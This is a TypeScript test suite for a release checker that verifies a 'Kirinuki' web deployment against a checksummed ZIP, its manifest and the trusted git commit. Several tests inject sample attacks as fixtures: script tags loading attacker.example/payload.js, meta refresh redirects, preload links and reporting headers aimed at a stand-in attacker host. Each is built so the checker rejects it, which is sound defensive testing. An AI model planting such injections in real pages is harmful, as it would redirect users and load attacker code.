import assert from "node:assert/strict";
import { spawn } from "node:child_process";
import { createHash } from "node:crypto";
import {
  chmod,
  mkdir,
  mkdtemp,
  readFile,
  realpath,
  rm,
  writeFile
} from "node:fs/promises";
import {
  createServer,
  type Server,
  type ServerResponse
} from "node:http";
import os from "node:os";
import path from "node:path";
import test, { after, before } from "node:test";
import { fileURLToPath } from "node:url";

import {
  MAX_PUBLIC_DEPLOYMENT_RESOURCE_BYTES,
  checkPublicDeployment,
  loadCurrentPublicDeploymentArtifact,
  type PublicDeploymentExpectedResource
} from "../scripts/check-public-deployment.js";
import {
  PUBLIC_SHELL_BIND_HOST,
  PUBLIC_SHELL_CANONICAL_URL,
  PUBLIC_SHELL_SECURITY_HEADERS
} from "../scripts/public-shell-server-core.js";
import {
  buildKirinukiReleaseRecord,
  serializeKirinukiReleaseRecord,
  sha256Bytes
} from "../scripts/release-record.js";
import { PUBLIC_WEB_PACKAGE_FILES } from "../scripts/web-package-files.js";

const repositoryRoot = fileURLToPath(new URL("..", import.meta.url));
// These fixtures intentionally exercise the Linux web-release contract through
// Info-ZIP (`zip -X`) and Unix archive modes. The checker itself remains covered
// on Windows by its platform-neutral parser/unit tests and by Linux CI here.
const publicDeploymentArtifactTest = process.platform === "win32"
  ? test.skip
  : test;

interface ArtifactFixture {
  readonly artifactDirectory: string;
  readonly archivePath: string;
  readonly manifestPath: string;
  readonly packagedBytes: ReadonlyMap<string, Buffer>;
  readonly releaseRevision: string;
  readonly root: string;
  readonly trustedRevision: string;
}

interface ArtifactFixtureOptions {
  readonly archiveOnlyIndexMutation?: (source: string) => string;
  readonly trustedIndexMutation?: (source: string) => string;
  readonly untrustedReleaseIndexMutation?: (source: string) => string;
}

function run(command: string, args: readonly string[], cwd: string): Promise<Buffer> {
  return new Promise<Buffer>((resolve, reject) => {
    const child = spawn(command, args, {
      cwd,
      shell: false,
      stdio: ["ignore", "pipe", "pipe"]
    });
    const stdout: Buffer[] = [];
    const stderr: Buffer[] = [];
    child.stdout.on("data", (chunk: Buffer) => stdout.push(chunk));
    child.stderr.on("data", (chunk: Buffer) => stderr.push(chunk));
    child.once("error", reject);
    child.once("close", (code, signal) => {
      if (code === 0 && signal === null) {
        resolve(Buffer.concat(stdout));
        return;
      }
      reject(new Error(
        `${command} 실패: ${signal || String(code)}\n`
          + Buffer.concat(stderr).toString("utf8")
      ));
    });
  });
}

async function commitAll(root: string, message: string): Promise<string> {
  await run("git", ["add", "--all"], root);
  await run("git", [
    "-c",
    "user.name=Kirinuki Test",
    "-c",
    "user.email=kirinuki-test@example.invalid",
    "commit",
    "--quiet",
    "-m",
    message
  ], root);
  return (await run("git", ["rev-parse", "HEAD"], root))
    .toString("utf8").trim();
}

async function createVerifiedArtifactFixture(
  options: Readonly<ArtifactFixtureOptions> = {}
): Promise<ArtifactFixture> {
  const root = await realpath(await mkdtemp(path.join(
    os.tmpdir(),
    "kirinuki-deployment-check-"
  )));
  const stage = path.join(root, "stage");
  const artifactDirectory = path.join(root, "dist");
  await run("git", ["init", "--quiet"], root);
  const currentMetadata = JSON.parse(
    await readFile(path.join(repositoryRoot, "package.json"), "utf8")
  ) as { readonly version: string };
  const packageJson = `${JSON.stringify({
    name: "kirinuki-app",
    version: currentMetadata.version
  }, null, 2)}\n`;
  const packageLock = `${JSON.stringify({
    name: "kirinuki-app",
    version: currentMetadata.version,
    lockfileVersion: 3,
    packages: {
      "": {
        name: "kirinuki-app",
        version: currentMetadata.version
      }
    }
  }, null, 2)}\n`;
  await Promise.all([
    writeFile(path.join(root, "package.json"), packageJson, { mode: 0o644 }),
    writeFile(path.join(root, "package-lock.json"), packageLock, { mode: 0o644 })
  ]);
  for (const { sourcePath } of PUBLIC_WEB_PACKAGE_FILES) {
    const destination = path.join(root, ...sourcePath.split("/"));
    await mkdir(path.dirname(destination), { recursive: true });
    let source = await readFile(
      path.join(repositoryRoot, ...sourcePath.split("/"))
    );
    if (
      sourcePath === "web/index.html"
      && options.trustedIndexMutation
    ) {
      source = Buffer.from(
        options.trustedIndexMutation(source.toString("utf8")),
        "utf8"
      );
    }
    await writeFile(
      destination,
      source,
      { mode: 0o644 }
    );
    await chmod(destination, 0o644);
  }
  const trustedRevision = await commitAll(root, "trusted release source");
  let releaseRevision = trustedRevision;
  if (options.untrustedReleaseIndexMutation) {
    const indexPath = path.join(root, "web", "index.html");
    await writeFile(
      indexPath,
      options.untrustedReleaseIndexMutation(await readFile(indexPath, "utf8")),
      { mode: 0o644 }
    );
    await chmod(indexPath, 0o644);
    releaseRevision = await commitAll(root, "untrusted alternate release source");
  }

  await Promise.all([
    mkdir(stage, { recursive: true }),
    mkdir(artifactDirectory, { recursive: true })
  ]);
  const packagedBytes = new Map<string, Buffer>();
  for (const { archivePath, sourcePath } of PUBLIC_WEB_PACKAGE_FILES) {
    const destination = path.join(stage, ...archivePath.split("/"));
    await mkdir(path.dirname(destination), { recursive: true });
    let bytes = await readFile(path.join(root, ...sourcePath.split("/")));
    if (
      archivePath === "index.html"
      && options.archiveOnlyIndexMutation
    ) {
      bytes = Buffer.from(
        options.archiveOnlyIndexMutation(bytes.toString("utf8")),
        "utf8"
      );
    }
    await writeFile(destination, bytes, { mode: 0o644 });
    await chmod(destination, 0o644);
    packagedBytes.set(archivePath, bytes);
  }
  const archiveName = `kirinuki-web-v${currentMetadata.version}.zip`;
  const archivePath = path.join(artifactDirectory, archiveName);
  const entries = PUBLIC_WEB_PACKAGE_FILES.map(({ archivePath: value }) => value)
    .sort();
  await run("zip", ["-X", "-q", archivePath, ...entries], stage);
  await chmod(archivePath, 0o644);
  const archive = await readFile(archivePath);
  const digest = createHash("sha256").update(archive).digest("hex");
  await writeFile(`${archivePath}.sha256`, `${digest}  ${archiveName}\n`);
  await chmod(`${archivePath}.sha256`, 0o644);

  const record = buildKirinukiReleaseRecord({
    identity: {
      name: "kirinuki-app",
      version: currentMetadata.version
    },
    packageLockSha256: sha256Bytes(packageLock),
    sourceRevision: releaseRevision,
    web: {
      bytes: archive.byteLength,
      checksumFile: `${archiveName}.sha256`,
      file: archiveName,
      sha256: digest
    }
  });
  const manifestName = `kirinuki-release-v${currentMetadata.version}.json`;
  const manifestPath = path.join(artifactDirectory, manifestName);
  const manifest = serializeKirinukiReleaseRecord(record);
  const manifestDigest = sha256Bytes(manifest);
  await writeFile(manifestPath, manifest, { mode: 0o644 });
  await writeFile(
    `${manifestPath}.sha256`,
    `${manifestDigest}  ${manifestName}\n`,
    { mode: 0o644 }
  );
  await Promise.all([
    chmod(manifestPath, 0o644),
    chmod(`${manifestPath}.sha256`, 0o644)
  ]);
  if (releaseRevision !== trustedRevision) {
    await run("git", ["checkout", "--quiet", "--detach", trustedRevision], root);
  }
  return {
    artifactDirectory,
    archivePath,
    manifestPath,
    packagedBytes,
    releaseRevision,
    root,
    trustedRevision
  };
}

async function listenEphemeral(server: Server): Promise<number> {
  await new Promise<void>((resolve, reject) => {
    server.once("error", reject);
    server.listen(0, PUBLIC_SHELL_BIND_HOST, resolve);
  });
  const address = server.address();
  assert(address && typeof address === "object");
  return address.port;
}

async function closeServer(server: Server): Promise<void> {
  await new Promise<void>((resolve) => server.close(() => resolve()));
}

function setExactHeaders(
  response: ServerResponse,
  contentType: string,
  contentLength?: number
): void {
  for (const [name, value] of Object.entries(PUBLIC_SHELL_SECURITY_HEADERS)) {
    response.setHeader(name, value);
  }
  response.setHeader("Content-Type", contentType);
  if (contentLength !== undefined) {
    response.setHeader("Content-Length", String(contentLength));
  }
}

function canonicalFetchThroughLoopback(port: number): typeof fetch {
  return (async (input: string | URL | Request, init?: RequestInit) => {
    const inputUrl = input instanceof Request
      ? input.url
      : input instanceof URL ? input.href : input;
    const canonical = new URL(inputUrl);
    assert.equal(canonical.origin, new URL(PUBLIC_SHELL_CANONICAL_URL).origin);
    const response = await fetch(
      `http://${PUBLIC_SHELL_BIND_HOST}:${port}${canonical.pathname}${canonical.search}`,
      init
    );
    Object.defineProperty(response, "url", {
      configurable: true,
      value: canonical.href
    });
    return response;
  }) as typeof fetch;
}

function createExactArtifactServer(
  resources: readonly PublicDeploymentExpectedResource[],
  observedRequests: string[],
  overrides: ReadonlyMap<string, Buffer> = new Map(),
  responseHeaderOverrides: Readonly<Record<string, string>> = {}
): Server {
  const resourcesByPath = new Map(
    resources.map((resource) => [resource.requestPath, resource] as const)
  );
  return createServer((request, response) => {
    const requestPath = request.url || "";
    observedRequests.push(requestPath);
    const resource = resourcesByPath.get(requestPath);
    if (!resource || request.method !== "GET") {
      response.statusCode = 404;
      response.end();
      return;
    }
    const body = overrides.get(requestPath) || resource.bytes;
    response.statusCode = 200;
    setExactHeaders(response, resource.contentType, body.byteLength);
    for (const [name, value] of Object.entries(responseHeaderOverrides)) {
      response.setHeader(name, value);
    }
    response.end(body);
  });
}

function fixtureCheckOptions(
  fixture: ArtifactFixture
): { readonly artifactDirectory: string; readonly repositoryRoot: string } {
  return {
    artifactDirectory: fixture.artifactDirectory,
    repositoryRoot: fixture.root
  };
}

function matchingPackagedArtifactFetch(
  fixture: ArtifactFixture,
  observedRequests: string[]
): typeof fetch {
  const contentTypeFor = (archivePath: string): string => {
    const type = new Map([
      [".css", "text/css; charset=utf-8"],
      [".html", "text/html; charset=utf-8"],
      [".js", "text/javascript; charset=utf-8"],
      [".md", "text/markdown; charset=utf-8"],
      [".txt", "text/plain; charset=utf-8"],
      [".wasm", "application/wasm"],
      [".woff2", "font/woff2"]
    ]).get(path.posix.extname(archivePath));
    assert(type);
    return type;
  };
  const resources = new Map<string, {
    readonly body: Buffer;
    readonly contentType: string;
  }>();
  for (const [archivePath, body] of fixture.packagedBytes) {
    if (archivePath === "_headers" || archivePath === ".popovic-hosts") {
      continue;
    }
    resources.set(archivePath === "index.html" ? "/" : `/${archivePath}`, {
      body,
      contentType: contentTypeFor(archivePath)
    });
  }
  return (async (input: string | URL | Request) => {
    const requestedUrl = input instanceof Request
      ? input.url
      : input instanceof URL ? input.href : input;
    const parsed = new URL(requestedUrl);
    const requestPath = `${parsed.pathname}${parsed.search}`;
    observedRequests.push(requestPath);
    const resource = resources.get(requestPath);
    assert(resource);
    const headers = new Headers({
      ...PUBLIC_SHELL_SECURITY_HEADERS,
      "Content-Length": String(resource.body.byteLength),
      "Content-Type": resource.contentType
    });
    const response = new Response(new Uint8Array(resource.body), {
      headers,
      status: 200
    });
    Object.defineProperty(response, "url", {
      configurable: true,
      value: requestedUrl
    });
    return response;
  }) as typeof fetch;
}

let sharedArtifact: ArtifactFixture;
let expectedResources: readonly PublicDeploymentExpectedResource[];

before(async () => {
  if (process.platform === "win32") {
    return;
  }
  sharedArtifact = await createVerifiedArtifactFixture();
  expectedResources = await loadCurrentPublicDeploymentArtifact(
    fixtureCheckOptions(sharedArtifact)
  );
});

after(async () => {
  if (sharedArtifact) {
    await rm(sharedArtifact.root, { recursive: true, force: true });
  }
});

publicDeploymentArtifactTest("공개 배포 checker는 checksum이 검증된 ZIP의 exact 공개 bytes만 통과시킨다", async (t) => {
  const observedRequests: string[] = [];
  const server = createExactArtifactServer(expectedResources, observedRequests);
  t.after(() => closeServer(server));
  const port = await listenEphemeral(server);

  const result = await checkPublicDeployment(
    PUBLIC_SHELL_CANONICAL_URL,
    canonicalFetchThroughLoopback(port),
    fixtureCheckOptions(sharedArtifact)
  );
  const indexResource = expectedResources.find(({ archivePath }) => (
    archivePath === "index.html"
  ));
  assert(indexResource);
  assert.deepEqual(result, {
    bytes: indexResource.bytes.byteLength,
    status: 200,
    url: PUBLIC_SHELL_CANONICAL_URL
  });
  assert.deepEqual(
    observedRequests,
    expectedResources.map(({ requestPath }) => requestPath)
  );
});

publicDeploymentArtifactTest("공개 배포 checker는 보고·refresh·legacy cookie 응답 헤더를 모두 거절한다", async (t) => {
  for (const [name, value] of [
    ["Refresh", "0; url=https://attacker.example/"],
    ["Reporting-Endpoints", 'default="https://attacker.example/report"'],
    ["Content-Security-Policy-Report-Only", "default-src 'none'; report-uri https://attacker.example/report"],
    ["Set-Cookie2", "legacy=bad; Path=/"]
  ] as const) {
    await t.test(name, async (subtest) => {
      const observedRequests: string[] = [];
      const server = createExactArtifactServer(
        expectedResources,
        observedRequests,
        new Map(),
        { [name]: value }
      );
      subtest.after(() => closeServer(server));
      const port = await listenEphemeral(server);
      await assert.rejects(
        checkPublicDeployment(
          PUBLIC_SHELL_CANONICAL_URL,
          canonicalFetchThroughLoopback(port),
          fixtureCheckOptions(sharedArtifact)
        ),
        new RegExp(name, "iu")
      );
      assert.deepEqual(observedRequests, ["/"]);
    });
  }
});

publicDeploymentArtifactTest("공개 배포 checker는 meta refresh·link·img·script·내부 경로 주입을 exact index 비교로 거절한다", async (t) => {
  const observedRequests: string[] = [];
  const indexResource = expectedResources.find(({ archivePath }) => (
    archivePath === "index.html"
  ));
  assert(indexResource);
  const injected = Buffer.from(
    indexResource.bytes.toString("utf8").replace(
      "</head>",
      '<meta http-equiv="refresh" content="0;url=https://attacker.example">'
        + '<link rel="preload" href="https://attacker.example/payload">'
        + '<script src="https://attacker.example/payload.js"></script></head>'
    ).replace(
      "</body>",
      '<img src="http://127.0.0.1:4320/editor.html" alt="bad"></body>'
    ),
    "utf8"
  );
  const server = createExactArtifactServer(
    expectedResources,
    observedRequests,
    new Map([["/", injected]])
  );
  t.after(() => closeServer(server));
  const port = await listenEphemeral(server);

  await assert.rejects(
    checkPublicDeployment(
      PUBLIC_SHELL_CANONICAL_URL,
      canonicalFetchThroughLoopback(port),
      fixtureCheckOptions(sharedArtifact)
    ),
    /index\.html bytes가 현재 공개 artifact와 다릅니다/u
  );
  assert.deepEqual(observedRequests, ["/"]);
});

publicDeploymentArtifactTest("공개 배포 checker는 artifact와 다른 CSS bytes를 거절한다", async (t) => {
  const observedRequests: string[] = [];
  const stylesheet = expectedResources.find(({ archivePath }) => (
    archivePath === "studio.css"
  ));
  assert(stylesheet);
  const wrongStylesheet = Buffer.from(stylesheet.bytes);
  const mutationOffset = wrongStylesheet.indexOf(Buffer.from("body", "utf8"));
  assert(mutationOffset >= 0);
  wrongStylesheet[mutationOffset] = wrongStylesheet[mutationOffset]! ^ 0x01;
  assert.equal(wrongStylesheet.byteLength, stylesheet.bytes.byteLength);
  const server = createExactArtifactServer(
    expectedResources,
    observedRequests,
    new Map([[stylesheet.requestPath, wrongStylesheet]])
  );
  t.after(() => closeServer(server));
  const port = await listenEphemeral(server);

  await assert.rejects(
    checkPublicDeployment(
      PUBLIC_SHELL_CANONICAL_URL,
      canonicalFetchThroughLoopback(port),
      fixtureCheckOptions(sharedArtifact)
    ),
    /studio\.css bytes가 현재 공개 artifact와 다릅니다/u
  );
  assert.deepEqual(observedRequests, ["/", stylesheet.requestPath]);
});

publicDeploymentArtifactTest("공개 배포 checker는 Content-Length 없는 oversized chunked body를 16 MiB에서 취소한다", async (t) => {
  const observedRequests: string[] = [];
  const indexResource = expectedResources.find(({ archivePath }) => (
    archivePath === "index.html"
  ));
  assert(indexResource);
  const maximumServerBytes = 2 * MAX_PUBLIC_DEPLOYMENT_RESOURCE_BYTES;
  const chunk = Buffer.alloc(64 * 1024, 0x61);
  let sentBytes = 0;
  let resolveClosed: (() => void) | null = null;
  const responseClosed = new Promise<void>((resolve) => {
    resolveClosed = resolve;
  });
  const server = createServer((request, response) => {
    observedRequests.push(request.url || "");
    response.statusCode = 200;
    setExactHeaders(response, indexResource.contentType);
    let timer: NodeJS.Timeout | null = null;
    const finish = (): void => {
      if (timer) {
        clearTimeout(timer);
        timer = null;
      }
      resolveClosed?.();
      resolveClosed = null;
    };
    response.once("close", finish);
    const writeNext = (): void => {
      if (response.destroyed || response.writableEnded) {
        return;
      }
      sentBytes += chunk.byteLength;
      response.write(chunk);
      if (sentBytes >= maximumServerBytes) {
        response.end();
        return;
      }
      timer = setTimeout(writeNext, 2);
    };
    writeNext();
  });
  t.after(() => closeServer(server));
  const port = await listenEphemeral(server);

  await assert.rejects(
    checkPublicDeployment(
      PUBLIC_SHELL_CANONICAL_URL,
      canonicalFetchThroughLoopback(port),
      fixtureCheckOptions(sharedArtifact)
    ),
    /16 MiB 크기 제한을 초과/u
  );
  await Promise.race([
    responseClosed,
    new Promise<never>((_resolve, reject) => {
      setTimeout(() => reject(new Error("oversized 응답 socket이 취소되지 않았습니다.")), 2_000);
    })
  ]);
  assert(sentBytes < maximumServerBytes);
  assert.deepEqual(observedRequests, ["/"]);
});

publicDeploymentArtifactTest("공개 배포 checker는 ZIP checksum sidecar 불일치를 fail-closed한다", async (t) => {
  const fixture = await createVerifiedArtifactFixture();
  t.after(() => rm(fixture.root, { recursive: true, force: true }));
  await writeFile(
    `${fixture.archivePath}.sha256`,
    `${"0".repeat(64)}  ${path.basename(fixture.archivePath)}\n`
  );
  await assert.rejects(
    loadCurrentPublicDeploymentArtifact(fixtureCheckOptions(fixture)),
    /SHA-256 sidecar/u
  );
});

publicDeploymentArtifactTest("공개 배포 checker는 재서명된 manifest의 잘못된 web size도 거절한다", async (t) => {
  const fixture = await createVerifiedArtifactFixture();
  t.after(() => rm(fixture.root, { recursive: true, force: true }));
  const manifest = JSON.parse(
    await readFile(fixture.manifestPath, "utf8")
  ) as {
    artifacts: { web: { bytes: number } };
  };
  manifest.artifacts.web.bytes += 1;
  const serialized = `${JSON.stringify(manifest, null, 2)}\n`;
  const manifestName = path.basename(fixture.manifestPath);
  await writeFile(fixture.manifestPath, serialized, { mode: 0o644 });
  await writeFile(
    `${fixture.manifestPath}.sha256`,
    `${sha256Bytes(serialized)}  ${manifestName}\n`,
    { mode: 0o644 }
  );
  await Promise.all([
    chmod(fixture.manifestPath, 0o644),
    chmod(`${fixture.manifestPath}.sha256`, 0o644)
  ]);
  await assert.rejects(
    loadCurrentPublicDeploymentArtifact(fixtureCheckOptions(fixture)),
    /exact path\/size\/SHA-256/u
  );
});

publicDeploymentArtifactTest("공개 배포 checker는 release manifest 또는 그 sidecar가 없으면 network 전에 fail-closed한다", async (t) => {
  for (const missing of ["manifest", "sidecar"] as const) {
    await t.test(missing, async (subtest) => {
      const fixture = await createVerifiedArtifactFixture();
      subtest.after(() => rm(fixture.root, { recursive: true, force: true }));
      await rm(
        missing === "manifest"
          ? fixture.manifestPath
          : `${fixture.manifestPath}.sha256`
      );
      let fetchCalls = 0;
      await assert.rejects(
        checkPublicDeployment(
          PUBLIC_SHELL_CANONICAL_URL,
          (async () => {
            fetchCalls += 1;
            throw new Error("network must not run");
          }) as typeof fetch,
          fixtureCheckOptions(fixture)
        ),
        /release manifest/u
      );
      assert.equal(fetchCalls, 0);
    });
  }
});

publicDeploymentArtifactTest("공개 배포 checker는 현재 trusted HEAD가 아닌 기존 commit의 self-consistent release와 live를 거절한다", async (t) => {
  const fixture = await createVerifiedArtifactFixture({
    untrustedReleaseIndexMutation: (source) => source.replace(
      "</body>",
      '<script src="https://attacker.example/payload.js"></script></body>'
    )
  });
  t.after(() => rm(fixture.root, { recursive: true, force: true }));
  assert.notEqual(fixture.releaseRevision, fixture.trustedRevision);
  const observedRequests: string[] = [];
  await assert.rejects(
    checkPublicDeployment(
      PUBLIC_SHELL_CANONICAL_URL,
      matchingPackagedArtifactFetch(fixture, observedRequests),
      fixtureCheckOptions(fixture)
    ),
    /현재 trusted HEAD commit과 다릅니다/u
  );
  assert.deepEqual(observedRequests, []);
});

publicDeploymentArtifactTest("공개 배포 checker는 commit·manifest·ZIP·fake live가 모두 일치해도 악성 shell을 거절한다", async (t) => {
  const fixture = await createVerifiedArtifactFixture({
    trustedIndexMutation: (source) => source.replace(
      "</head>",
      '<meta http-equiv="refresh" content="0;url=https://attacker.example">'
        + '<link rel="preload" href="https://attacker.example/payload">'
        + "</head>"
    ).replace(
      "</body>",
      '<script src="https://attacker.example/payload.js"></script>'
        + '<img src="http://127.0.0.1:4320/editor.html" alt="bad">'
        + "</body>"
    )
  });
  t.after(() => rm(fixture.root, { recursive: true, force: true }));
  assert.equal(fixture.releaseRevision, fixture.trustedRevision);
  const observedRequests: string[] = [];
  await assert.rejects(
    checkPublicDeployment(
      PUBLIC_SHELL_CANONICAL_URL,
      matchingPackagedArtifactFetch(fixture, observedRequests),
      fixtureCheckOptions(fixture)
    ),
    /정적 웹 편집기 정책을 위반/u
  );
  assert.deepEqual(observedRequests, []);
});

publicDeploymentArtifactTest("공개 배포 checker는 ZIP·sidecar·manifest를 함께 다시 만든 source blob 불일치도 거절한다", async (t) => {
  const fixture = await createVerifiedArtifactFixture({
    archiveOnlyIndexMutation: (source) => source.replace(
      "Kirinuki",
      "Kirinukx"
    )
  });
  t.after(() => rm(fixture.root, { recursive: true, force: true }));
  const observedRequests: string[] = [];
  await assert.rejects(
    checkPublicDeployment(
      PUBLIC_SHELL_CANONICAL_URL,
      matchingPackagedArtifactFetch(fixture, observedRequests),
      fixtureCheckOptions(fixture)
    ),
    /100644 blob과 다릅니다/u
  );
  assert.deepEqual(observedRequests, []);
});
